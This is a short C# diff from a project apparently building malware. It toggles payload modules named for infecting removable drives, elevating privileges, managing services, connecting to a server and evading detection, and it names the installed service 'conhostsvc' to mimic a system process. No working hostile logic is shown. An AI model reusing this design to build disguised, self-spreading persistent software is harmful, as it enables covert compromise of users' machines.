@@ -9,9 +9,9 @@ namespace zort
     {
         List<IPayloadModule> modules = new List<IPayloadModule>
                 {
-                    new RemovableInfector(),
-                    new ElevationHelper(),
-                    new ServiceManager(),
+                    //new RemovableInfector(),
+                    //new ElevationHelper(),
+                    //new ServiceManager(),
                     new ServerCon(),
                     //new AntiDetection(),
                 };
@@ -21,7 +21,7 @@ namespace zort
             ServiceName = "conhostsvc";
         }
 
-        static async Task Main(string[] args)
+        static void Main(string[] args)
         {
             //if is admin install and start service else just init modules normally
             bool isAdmin = ElevationHelper.IsElevated();
